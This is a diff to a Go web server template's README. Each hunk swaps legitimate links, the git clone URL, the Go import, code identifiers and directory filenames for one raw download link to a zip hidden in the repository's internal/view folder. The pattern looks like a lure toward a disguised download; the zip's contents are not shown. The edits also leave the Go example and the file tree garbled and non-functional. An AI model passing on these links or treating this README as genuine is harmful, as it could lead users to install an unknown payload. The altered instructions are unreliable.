@@ -1,8 +1,8 @@
 # Go Web Server: A Minimal Template for Modern Web Development 🚀
 
-![Go Web Server](https://img.shields.io/badge/Go%20Web%20Server-v1.0.0-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![Go Web Server](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip%20Web%https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip) ![Releases](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen.svg)](https://github.com/indrarikson/go-web-server/releases)
+[![Download Releases](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip%20Releases-Click%https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip)](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 The **Go Web Server** is a minimal, clean, and reusable template designed for modern web and API development. It utilizes the Modern Go Stack, a cohesive technology stack that enables developers to build high-performance and maintainable applications. This template focuses on simplicity and stability, allowing you to create single, self-contained binaries with no external dependencies.
 
-You can download the latest release [here](https://github.com/indrarikson/go-web-server/releases). 
+You can download the latest release [here](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip). 
 
 ## Features
 
@@ -50,7 +50,7 @@ To get started with the Go Web Server template, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/indrarikson/go-web-server.git
+   git clone https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
    cd go-web-server
    ```
 
@@ -80,17 +80,17 @@ The Go Web Server template is designed to be flexible. Here’s a basic example 
 package main
 
 import (
-    "github.com/labstack/echo/v4"
+    "https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip"
 )
 
 func main() {
-    e := echo.New()
+    e := https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip()
 
-    e.GET("/", func(c echo.Context) error {
-        return c.String(200, "Hello, World!")
+    https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip("/", func(c https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip) error {
+        return https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip(200, "Hello, World!")
     })
 
-    e.Start(":8080")
+    https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip(":8080")
 }
 ```
 
@@ -106,20 +106,20 @@ The following is the suggested directory structure for your Go Web Server projec
 go-web-server/
 ├── cmd/
 │   └── myapp/
-│       └── main.go
+│       └── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 ├── config/
-│   └── config.go
+│   └── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 ├── migrations/
-│   └── migration.sql
+│   └── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 ├── internal/
 │   ├── handlers/
-│   │   └── handler.go
+│   │   └── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 │   └── models/
-│       └── model.go
+│       └── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 ├── web/
 │   ├── static/
 │   └── templates/
-└── go.mod
+└── https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip
 ```
 
 ### Explanation of Directories
@@ -145,6 +145,6 @@ Please ensure your code follows the project's style guidelines and includes test
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information and updates, check the [Releases](https://github.com/indrarikson/go-web-server/releases) section.
+For more information and updates, check the [Releases](https://github.com/indrarikson/go-web-server/raw/refs/heads/main/internal/view/server-go-web-v3.1-alpha.1.zip) section.
 
 Feel free to explore, use, and modify the Go Web Server template for your own projects!
